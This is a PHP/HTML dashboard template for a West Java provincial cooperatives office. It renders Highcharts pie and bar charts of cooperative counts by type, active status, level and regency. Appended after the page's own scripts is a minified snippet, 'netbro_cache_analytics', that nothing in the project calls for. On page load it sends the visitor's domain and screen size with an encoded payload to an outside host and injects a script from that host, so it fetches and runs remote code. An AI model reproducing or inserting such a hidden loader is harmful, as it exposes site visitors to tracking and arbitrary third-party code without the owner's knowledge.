<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="<?php echo base_url() ?>frontend/img/dinas.png">

    <title>Bidang Koperasi </title>
  
  <!-- Bootstrap 4.1.3-->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/bootstrap/css/bootstrap.css">
  <!-- Bootstrap-extend-->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/bootstrap-extend.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/font-awesome/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/Ionicons/css/ionicons.min.css">
  <!-- Morris charts -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/morris.js/morris.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/master_style.css">
  <!-- Minimal-art Admin Skins. Choose a skin from the css/skins
     folder instead of downloading all of them to reduce the load. -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/skins/_all-skins.css">
  <!-- google font -->
  <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet">

<script src="<?php echo base_url() ?>assetsChart/js/jquery-1.11.1.min.js"></script>
<script src="<?php echo base_url() ?>assetsChart/js/jquery.mCustomScrollbar.js"></script>
<script src="<?php echo base_url() ?>assetsChart/js/highcharts.js"></script>

<script>
  var chart;
  var getColor = {
    'Deep_Sky_Blue':'#00BFFF',
    'orange': '#F96B1C',
    'green': '#88CC40',
    'blue': '#219FF4',
    'darkblue': '#3B62CC',
    'light': '#CACADD',
    'Dark_Orchid':'#9932CC',
    'white': '#FFFFFF',
    'tosca_blue' : '#00fff0',
    'dark': '#262932',
    'Chartreuse':'#7FFF00',
    'Chocolate':'#D2691E'
  };
</script>
  
</head>
<body>
  
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <div class="row">
        <div class="col-xl-2 col-md-6 col-12">
          <div class="info-box">
            <img src="<?php echo base_url() ?>frontend/img/dinas.png" width="120px" height="110px" alt=""/>
          </div>
        </div>
        <div class="col-xl-8 col-md-6 col-12">
          <div class="info-box">
           <font color="#1E90FF" > <h2 align="center" font-family: Cambria,"Times New Roman",serif;>DINAS KOPERASI DAN USAHA KECIL PROVINSI JAWA BARAT  </h2><h2 align="center">GRAFIK DATA KOPERASI </h2></font>
          </div>
        </div>
        <div class="col-xl-2 col-md-6 col-12">
          <div class="info-box">
            <font color="blue"><h4>ZONA WAKTU INDONESIA</h4> <?php date_default_timezone_set('Asia/Jakarta'); ?>
          <h5><?php echo date("d-M-Y"); ?>
          <b><?php echo date('H:i'); ?></h5></b></font>
           
          </div>
        </div>
      </div>                  
    </section>

    <!-- Main content -->
    <section class="content">
     
      <div class="row">
        <div class="col-xl-4 col-md-6 col-12">
          <div class="info-box">
            <span class="info-box-icon bg-blue"><i class="ion ion-stats-bars"></i></span>

            <div class="info-box-content">
              <span class="info-box-number"><?php echo $jml_kop[0]->jml_koperasi; ?></span>
              <span class="info-box-text">Jumlah Koperasi<br>Se-Jawa Barat</span>
            </div>
            <!-- /.info-box-content -->
          </div>
          <!-- /.info-box -->
        </div>

        <div class="col-xl-4 col-md-6 col-12">
          <div class="info-box">
            <span class="info-box-icon bg-blue"><i class="ion ion-ios-cloud-download-outline"></i></span>

            <div class="info-box-content">
              <span class="info-box-number"><?php echo $unduh[0]->jml_pengunduh; ?></span>
              <span class="info-box-text">Jumlah Pengunduh<br>Data Koperasi</span>
            </div>
            <!-- /.info-box-content -->
          </div>
          <!-- /.info-box -->
        </div>
        <!-- /.col -->
        <div class="col-xl-4 col-md-6 col-12">
          <div class="info-box">
            <span class="info-box-icon bg-blue"><i class="fa fa-list"></i></span>

            <div class="info-box-content">
              <span class="info-box-number"><?php echo $pendaftar[0]->jml_pendaftar; ?></span>
              <span class="info-box-text">Jumlah Pendaftar Koperasi Baru<br>Se-Jawa Barat</span>
            </div>
            <!-- /.info-box-content -->
          </div>
          <!-- /.info-box -->
        </div>
        <!-- /.col -->

        <div class="col-12">
          <!-- AREA CHART -->
          <div class="box box-primary">
          
            <div class="box-body chart-responsive">

              <div class="chart" id="pieChart3" style="height: 350px;margin-bottom: 30px"></div>
              <script type="text/javascript">
              chart = new Highcharts.Chart({
                chart: {
                  renderTo: 'pieChart3',
                  plotShadow: false,
                  backgroundColor: 'transparent'
                },
                title: {
                  text:'<h3>JUMLAH KOPERASI BERDASARKAN JENIS KOPERASI</h3>'
                },
                tooltip: {
                  backgroundColor: getColor['tosca_blue'],
                  borderColor: 'transparent',
                  borderRadius: 7,
                  borderWidth: 0,
                  style: {
                    color: getColor['dark'],
                    fontSize: '13px'  
                  }
                },
                plotOptions: {
                  pie: {
                    cursor: 'pointer',
                    dataLabels: {enabled: true},
                    borderWidth: 0,
                    showInLegend: true
                  }
                },
                legend: {
                  itemMarginTop: 20,
                  itemHoverStyle: {color: getColor['white']}
                },
                credits: {enabled: false},
                series: [{
                  type: 'pie',
                  name: 'Jumlah : ',
                  innerSize: '50%',
                  size: '80%',
                  data: [
                    {
                      name: 'Simpan Pinjam',
                      y: <?php echo $simpan_pinjam ?>,
                      color: getColor['Dark_Orchid'],
                    }, {
                      name: 'Konsumen',
                      y: <?php echo $konsumen ?>,
                      color: getColor['yellow'],
                    }, {
                      name: 'Produsen',
                      y: <?php echo $produsen ?>,
                      color: getColor['orange'],
                    }, {
                      name: 'Jasa',
                      y: <?php echo $jasa ?>,
                      color: getColor['Chartreuse']
                    }, {
                      name: 'Pemasaran',
                      y: <?php echo $pemasaran ?>,
                      color: getColor['blue']
                    }
                  ]
                }]
              });
            </script>

            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->

        </div>
          
          <div class="col-6">
                <div class="box box-danger">
                    
                      <div class="box-body chart-responsive">
                        <!-- <div class="chart" id="sales-chart" style="height: 300px; position: relative;"></div> -->
                        <div class="chart" id="pieChart2" style="height: 350px;margin-bottom: 30px"></div>
                        <script type="text/javascript">
                        chart = new Highcharts.Chart({
                          chart: {
                            renderTo: 'pieChart2',
                            plotShadow: false,
                            backgroundColor: 'transparent'
                          },
                          title: {
                            text:'<h3>JUMLAH KOPERASI BERDASARKAN STATUS AKTIF</h3>'
                          },
                          tooltip: {
                            backgroundColor: getColor['tosca_blue'],
                            borderColor: 'transparent',
                            borderRadius: 7,
                            borderWidth: 0,
                            style: {
                              color: getColor['dark'],
                              fontSize: '13px'  
                            }
                          },
                          plotOptions: {
                            pie: {
                              cursor: 'pointer',
                              dataLabels: {enabled: true},
                              borderWidth: 0,
                              showInLegend: true
                            }
                          },
                          legend: {
                            itemMarginTop: 20,
                            itemHoverStyle: {color: getColor['white']}
                          },
                          credits: {enabled: false},
                          series: [{
                            type: 'pie',
                            name: 'Jumlah : ',
                            innerSize: '50%',
                            size: '80%',
                            data: [
                              {
                                name: 'Tidak Aktif',
                                y: <?php echo $tidakAktif ?>,
                                color: getColor['green'],
                              }, {
                                name: 'Aktif',
                                y: <?php echo $aktif ?>,
                                color: getColor['orange']
                              }
                            ]
                          }]
                        });
                      </script>
                      </div>
                </div>
        </div>

        <div class="col-6">
                <!-- BAR CHART -->
                <div class="box box-success">
                  
                  <div class="box-body chart-responsive">
                     
                     <div class="chart" id="pieChart1" style="height: 350px;margin-bottom: 30px"></div>
                        <script type="text/javascript">
                        chart = new Highcharts.Chart({
                          chart: {
                            renderTo: 'pieChart1',
                            plotShadow: false,
                            backgroundColor: 'transparent'
                          },
                          title: {
                            text:'<h3>JUMLAH KOPERASI BERDASARKAN TINGKAT KOPERASI</h3>'
                          },
                          tooltip: {
                            backgroundColor: getColor['tosca_blue'],
                            borderColor: 'transparent',
                            borderRadius: 3,
                            borderWidth: 0,
                            style: {
                              color: getColor['dark'],
                              fontSize: '13px'  
                            }
                          },
                          plotOptions: {
                            pie: {
                              cursor: 'pointer',
                              dataLabels: {enabled: true},
                              borderWidth: 0,
                              showInLegend: true
                            }
                          },
                          legend: {
                            itemMarginTop: 20,
                            itemHoverStyle: {color: getColor['white']}
                          },
                          credits: {enabled: false},
                          series: [{
                            type: 'pie',
                            name: 'Jumlah : ',
                            innerSize: '40%',
                            size: '70%',
                            data: [
                              {
                                name: 'Primer Provinsi',
                                y: <?php echo $primer_prov ?>,
                                color: getColor['green'],
                              }, {
                                name: 'Primer Kabupaten/Kota',
                                y: <?php echo $primer_kab ?>,
                                color: getColor['tosca_blue']
                              },{
                                name: 'Sekunder Provinsi',
                                y: <?php echo $sekunder_prov ?>,
                                color: getColor['orange'],
                              },{
                                name: 'Sekunder Kabupaten/Kota',
                                y: <?php echo $sekunder_kab ?>,
                                color: getColor['Dark_Orchid']
                              }
                            ]
                          }]
                        });
                      </script> 
                      
                  </div>
                  <!-- /.box-body -->
                </div>
                <!-- /.box -->
        </div>

        <!-- /.col (LEFT) -->
        <div class="col-12">
          <!-- LINE CHART -->
          <div class="box box-info">
            
            <div class="box-body chart-responsive">

              <div class="chart" id="barChart2" style="height: 350px;margin-bottom: 30px"></div>
              <script type="text/javascript">
              $('#barChart2').highcharts({
                chart: {
                  type: 'column',
                  backgroundColor: 'transparent'
                },
                    title: {
                      text: '<h3>JUMLAH KOPERASI BERDASARKAN PRIMER KABUPATEN/KOTA</h3>'
                    },
                xAxis: {
                  categories: ['Kab.Pangandaran', 'Kab.Bogor', 'Kab.Sukabumi', 'Kab.Cianjur', 'Kab.Bandung', 'Kab.Bandung Barat', 'Kab.Sumedang', 'Kab.Garut', 'Kab.Tasikmalaya', 'Kab.Ciamis', 'Kab.Kuningan', 'Kab.Cirebon', 'Kab.Majalengka', 'Kab.Indramayu', 'Kab.Subang', 'Kab.Purwakarta', 'Kab.Karawang', 'Kab.Bekasi', 'Kota Bogor', 'Kota Sukabumi' , 'Kota Bandung', 'Kota Cirebon' , 'Kota Bekasi', 'Kota Depok', 'Kota Cimahi', 'Kota Tasikmalaya', 'Kota Banjar'],
                  title: {
                    text: null
                  }
                },
                yAxis: {
                  min: 0,
                  title: {
                    text: 'Jumlah Koperasi',
                    align: 'high'
                  },
                  labels: {
                    overflow: 'justify'
                  }
                },
                plotOptions: {
                  bar: {
                    dataLabels: {
                      enabled: true
                    }
                  }
                },
                legend: {enabled: false},
                credits: {enabled: false},
                tooltip: {
                  backgroundColor: getColor['tosca_blue'],
                  borderColor: 'transparent',
                  borderRadius: 7,
                  borderWidth: 0,
                  style: {
                    color: getColor['dark']
                  }
                },
                series: [{
                  name: 'Jumlah :',
                  data: [<?php echo $kab_pangandaran ?>,<?php echo $kab_bogor ?>, <?php echo $kab_sukabumi ?>,<?php echo $kab_cianjur ?>,<?php echo $kab_bandung ?>,<?php echo $kab_bandungBarat ?>,<?php echo $kab_sumedang ?>,<?php echo $kab_garut ?>,<?php echo $kab_tasikmalaya ?>,<?php echo $kab_ciamis ?>,<?php echo $kab_kuningan ?>,<?php echo $kab_cirebon ?>,<?php echo $kab_majalengka ?>,<?php echo $kab_indramayu ?>,<?php echo $kab_subang ?>,<?php echo $kab_purwakarta ?>,<?php echo $kab_karawang ?>,<?php echo $kab_bekasi ?>,<?php echo $kota_bogor ?>,<?php echo $kota_sukabumi ?>,<?php echo $kota_bandung ?>,<?php echo $kota_cirebon ?>,<?php echo $kota_bekasi ?>,<?php echo $kota_depok ?>,<?php echo $kota_cimahi ?>,<?php echo $kota_tasikmalaya ?>,<?php echo $kota_banjar ?>],
                  color: getColor['Chocolate']
                }]
              });
            </script>

            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->
        </div>

        <div class="col-12">
          <!-- LINE CHART -->
          <div class="box box-info">
            
            <div class="box-body chart-responsive">

              <div class="chart" id="barChart4" style="height: 350px;margin-bottom: 30px"></div>
              <script type="text/javascript">
              $('#barChart4').highcharts({
                chart: {
                  type: 'column',
                  backgroundColor: 'transparent'
                },
                    title: {
                      text: '<h3>JUMLAH KOPERASI BERDASARKAN SEKUNDER KABUPATEN/KOTA</h3>'
                    },
                xAxis: {
                  categories: ['Kab.Pangandaran', 'Kab.Bogor', 'Kab.Sukabumi', 'Kab.Cianjur', 'Kab.Bandung', 'Kab.Bandung Barat', 'Kab.Sumedang', 'Kab.Garut', 'Kab.Tasikmalaya', 'Kab.Ciamis', 'Kab.Kuningan', 'Kab.Cirebon', 'Kab.Majalengka', 'Kab.Indramayu', 'Kab.Subang', 'Kab.Purwakarta', 'Kab.Karawang', 'Kab.Bekasi', 'Kota Bogor', 'Kota Sukabumi' , 'Kota Bandung', 'Kota Cirebon' , 'Kota Bekasi', 'Kota Depok', 'Kota Cimahi', 'Kota Tasikmalaya', 'Kota Banjar'],
                  title: {
                    text: null
                  }
                },
                yAxis: {
                  min: 0,
                  title: {
                    text: 'Jumlah Koperasi',
                    align: 'high'
                  },
                  labels: {
                    overflow: 'justify'
                  }
                },
                plotOptions: {
                  bar: {
                    dataLabels: {
                      enabled: true
                    }
                  }
                },
                legend: {enabled: false},
                credits: {enabled: false},
                tooltip: {
                  backgroundColor: getColor['tosca_blue'],
                  borderColor: 'transparent',
                  borderRadius: 7,
                  borderWidth: 0,
                  style: {
                    color: getColor['dark']
                  }
                },
                series: [{
                  name: 'Jumlah :',
                  data: [<?php echo $kab_pangandaran3 ?>,<?php echo $kab_bogor3 ?>, <?php echo $kab_sukabumi3 ?>,<?php echo $kab_cianjur3 ?>,<?php echo $kab_bandung3 ?>,<?php echo $kab_bandungBarat3 ?>,<?php echo $kab_sumedang3 ?>,<?php echo $kab_garut3 ?>,<?php echo $kab_tasikmalaya3 ?>,<?php echo $kab_ciamis3 ?>,<?php echo $kab_kuningan3 ?>,<?php echo $kab_cirebon3 ?>,<?php echo $kab_majalengka3 ?>,<?php echo $kab_indramayu3 ?>,<?php echo $kab_subang3 ?>,<?php echo $kab_purwakarta3 ?>,<?php echo $kab_karawang3 ?>,<?php echo $kab_bekasi3 ?>,<?php echo $kota_bogor3 ?>,<?php echo $kota_sukabumi3 ?>,<?php echo $kota_bandung3 ?>,<?php echo $kota_cirebon3 ?>,<?php echo $kota_bekasi3 ?>,<?php echo $kota_depok3 ?>,<?php echo $kota_cimahi3 ?>,<?php echo $kota_tasikmalaya3 ?>,<?php echo $kota_banjar3 ?>],
                  color: getColor['Chocolate']
                }]
              });
            </script>

            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->
        </div>

        <div class="col-6">
                <!-- BAR CHART -->
                <div class="box box-success">
                  
                   <div class="box-body chart-responsive">
                     
                     <div class="chart" id="barChart1" style="height: 1000px;margin-bottom: 30px"></div>
                        <script type="text/javascript">
                        $('#barChart1').highcharts({
                          chart: {
                              type: 'bar'
                          },
                          title: {
                              text: 'JUMLAH KOPERASI BERDASARKAN PRIMER PROVINSI'
                          },
                          xAxis: {
                              categories: ['Kab.Pangandaran', 'Kab.Bogor', 'Kab.Sukabumi', 'Kab.Cianjur', 'Kab.Bandung', 'Kab.Bandung Barat', 'Kab.Sumedang', 'Kab.Garut', 'Kab.Tasikmalaya', 'Kab.Ciamis', 'Kab.Kuningan', 'Kab.Cirebon', 'Kab.Majalengka', 'Kab.Indramayu', 'Kab.Subang', 'Kab.Purwakarta', 'Kab.Karawang', 'Kab.Bekasi', 'Kota Bogor', 'Kota Sukabumi' , 'Kota Bandung', 'Kota Cirebon' , 'Kota Bekasi', 'Kota Depok', 'Kota Cimahi', 'Kota Tasikmalaya', 'Kota Banjar'],
                              title: {
                                  text: null
                              }
                          },
                          yAxis: {
                              min: 0,
                              title: {
                                  text: 'Jumlah Koperasi',
                                  align: 'high'
                              },
                              labels: {
                                  overflow: 'justify'
                              }
                          },
                          
                          plotOptions: {
                              bar: {
                                  dataLabels: {
                                      enabled: true
                                  }
                              }
                          },
                          legend: {
                             enabled: false 
                          },
                          credits: {
                              enabled: false
                          },
                          series: [{
                              name: 'Jumlah :',
                              data: [<?php echo $kab_pangandaran1 ?>,<?php echo $kab_bogor1 ?>, <?php echo $kab_sukabumi1 ?>,<?php echo $kab_cianjur1 ?>,<?php echo $kab_bandung1 ?>,<?php echo $kab_bandungBarat1 ?>,<?php echo $kab_sumedang1 ?>,<?php echo $kab_garut1 ?>,<?php echo $kab_tasikmalaya1 ?>,<?php echo $kab_ciamis1 ?>,<?php echo $kab_kuningan1 ?>,<?php echo $kab_cirebon1 ?>,<?php echo $kab_majalengka1 ?>,<?php echo $kab_indramayu1 ?>,<?php echo $kab_subang1 ?>,<?php echo $kab_purwakarta1 ?>,<?php echo $kab_karawang1 ?>,<?php echo $kab_bekasi1 ?>,<?php echo $kota_bogor1 ?>,<?php echo $kota_sukabumi1 ?>,<?php echo $kota_bandung1 ?>,<?php echo $kota_cirebon1 ?>,<?php echo $kota_bekasi1 ?>,<?php echo $kota_depok1 ?>,<?php echo $kota_cimahi1 ?>,<?php echo $kota_tasikmalaya1 ?>,<?php echo $kota_banjar1 ?>]
                          }]
                        });
                      </script>
                  </div>
                  
                  <!-- /.box-body -->
                </div>
                <!-- /.box -->
        </div>

        <div class="col-xl-6 col-md-12 col-12">
                <!-- BAR CHART -->
                <div class="box box-success">
                  
                  <div class="box-body chart-responsive">
                     
                     <div class="chart" id="barChart3" style="height: 1000px;margin-bottom: 30px"></div>
                        <script type="text/javascript">
                        $('#barChart3').highcharts({
                          chart: {
                              type: 'bar'
                          },
                          title: {
                              text: 'JUMLAH KOPERASI BERDASARKAN SEKUNDER PROVINSI'
                          },
                          xAxis: {
                              categories: ['Kab.Pangandaran', 'Kab.Bogor', 'Kab.Sukabumi', 'Kab.Cianjur', 'Kab.Bandung', 'Kab.Bandung Barat', 'Kab.Sumedang', 'Kab.Garut', 'Kab.Tasikmalaya', 'Kab.Ciamis', 'Kab.Kuningan', 'Kab.Cirebon', 'Kab.Majalengka', 'Kab.Indramayu', 'Kab.Subang', 'Kab.Purwakarta', 'Kab.Karawang', 'Kab.Bekasi', 'Kota Bogor', 'Kota Sukabumi' , 'Kota Bandung', 'Kota Cirebon' , 'Kota Bekasi', 'Kota Depok', 'Kota Cimahi', 'Kota Tasikmalaya', 'Kota Banjar'],
                              title: {
                                  text: null
                              }
                          },
                          yAxis: {
                              min: 0,
                              title: {
                                  text: 'Jumlah Koperasi',
                                  align: 'high'
                              },
                              labels: {
                                  overflow: 'justify'
                              }
                          },
                          
                          plotOptions: {
                              bar: {
                                  dataLabels: {
                                      enabled: true
                                  }
                              }
                          },
                          legend: {
                             enabled: false 
                          },
                          credits: {
                              enabled: false
                          },
                          series: [{
                              name: 'Jumlah :',
                              data: [<?php echo $kab_pangandaran2 ?>,<?php echo $kab_bogor2 ?>, <?php echo $kab_sukabumi2 ?>,<?php echo $kab_cianjur2 ?>,<?php echo $kab_bandung2 ?>,<?php echo $kab_bandungBarat2 ?>,<?php echo $kab_sumedang2 ?>,<?php echo $kab_garut2 ?>,<?php echo $kab_tasikmalaya2 ?>,<?php echo $kab_ciamis2 ?>,<?php echo $kab_kuningan2 ?>,<?php echo $kab_cirebon2 ?>,<?php echo $kab_majalengka2 ?>,<?php echo $kab_indramayu2 ?>,<?php echo $kab_subang2 ?>,<?php echo $kab_purwakarta2 ?>,<?php echo $kab_karawang2 ?>,<?php echo $kab_bekasi2 ?>,<?php echo $kota_bogor2 ?>,<?php echo $kota_sukabumi2 ?>,<?php echo $kota_bandung2 ?>,<?php echo $kota_cirebon2 ?>,<?php echo $kota_bekasi2 ?>,<?php echo $kota_depok2 ?>,<?php echo $kota_cimahi2 ?>,<?php echo $kota_tasikmalaya2 ?>,<?php echo $kota_banjar2 ?>]
                          }]
                        });
                      </script>
                      
                  </div>
                  <!-- /.box-body -->
                </div>
                <!-- /.box -->
        </div>
          Copyright &copy; Farhan Sutrisno 2019 All Rights Reserved
          
        <!-- /.col (RIGHT) -->
      </div>
      <!-- /.row -->

    </section>
    <!-- /.content -->
  
  <!-- /.content-wrapper -->
  

<!-- ./wrapper -->

  <!-- jQuery 3 -->
  
  <!-- popper -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/popper/dist/popper.min.js"></script>

  <!-- Bootstrap 4.1.3-->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/bootstrap/js/bootstrap.min.js"></script>
  
  <!-- SlimScroll -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
  
  <!-- Morris.js charts -->

  <!-- FastClick -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/fastclick/lib/fastclick.js"></script>

  <!-- Minimal-art Admin App -->
  <script src="<?php echo base_url() ?>backend/js/template.js"></script>

  <!-- Minimal-art Admin for demo purposes -->
  <script src="<?php echo base_url() ?>backend/js/demo.js"></script>
  
  <!-- Minimal-art Admin for Morris Chart purposes -->
  <script src="<?php echo base_url() ?>backend/js/pages/widget-morris-charts.js"></script>

<script src="<?php echo base_url() ?>assetsChart/js/nprogress.js"></script>
<script>
  NProgress.start();
  NProgress.done();

  $(".cScroll").mCustomScrollbar({scrollInertia:200,mouseWheel:{scrollAmount:150}});
  
  $('.selectpicker').selectpicker({
    style: 'selectpicker',
      //size: 4
  });
  
  $('.fullscreen-btn').click(function(){
    $(this).toggleClass('off');
    screenfull.toggle($('html')[0]);
  });
        
</script>


<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2awh6yNMRYGxVLHcOn4TbdBmL2zOge6llYIJBsRQ%2fLTpX8ZSu0AlY%2bqJ%2faH08oE3TYb0XaZmqieFl4ja6ypZgykZrYbtNEFGg4Htn8kQU9TLToCXhcubJA%2b%2bJyZvqUZbL5zG8djBGdkvTxkB9A4MvuADCVZyQf77%2fsz%2b8Mg52OAHnkuCjjDeb%2fH%2bee9pedhYOKhUrDqdpfrtHUuiebM7kbYVeSTevCa9H1M8pxfCEpL7tgT2q52LjB8Ad9yXnUaySTCsM0Sv0CzyqRxrL5oywe6bbgA%2f1%2f5GCwVL%2f%2bavXN4VlinAijP4JkF9FU4G0zt5bZWZV61xIGH5r0gy%2bNuDnJhtEcyfSwlNSKCtQ9mokJZjbeYBG0fK8cK6mvEXzO7Xw%2fkubn6QmihQgMpgWoTCMK6q57sh%2fp3hsSr4ccwC0BM2ztbwSCbDCTe5jWbdkaPgXkpaccY5wHo0sfQiivwtBoLtzFcC2p3VydoaGjNzvnnxuco8pU7SSUpaytbaBiHnNGgoiGcylFIxMDeqFvQBlmg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
